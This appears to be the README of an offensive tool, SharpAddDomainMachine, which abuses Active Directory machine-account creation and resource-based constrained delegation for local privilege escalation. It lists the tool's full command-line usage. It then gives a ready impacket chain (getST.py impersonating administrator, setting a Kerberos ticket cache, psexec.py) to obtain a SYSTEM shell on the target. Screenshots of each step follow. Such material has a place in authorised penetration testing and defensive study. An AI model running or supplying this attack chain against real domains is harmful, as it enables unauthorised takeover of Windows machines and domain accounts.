# SharpAddDomainMachine
## Description
The same script as [SharpAllowedToAct](https://github.com/pkb1s/SharpAllowedToAct), but more usefully for local privilege escalation.

## Usage
```
SharpAddDomainMachine

SharpAddDomainMachine.exe domain=domain.com dc=192.168.1.1 tm=target_machine_name ma=machine_account mp=machine_pass

domain: Set the target domain.
dc:     Set the domain controller to use.
tm:     Set the name of the target computer you want to exploit. Need to have write access to the computer object.
ma:     Set the name of the new machine.(default:random)
mp:     Set the password for the new machine.(default:random)
```

After successful attack use impacket to get system:
```
getST.py -dc-ip dc_ip domain.com/ma:mp -spn cifs/tm.domain -impersonate administrator
export KRB5CCNAME=administrator.ccache
psexec.py domain/administrator@tm.domain -k -no-pass
```

exploit:
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200321153023.png)
get ccache:
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200321153107.png)
get system:
![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200321153123.png)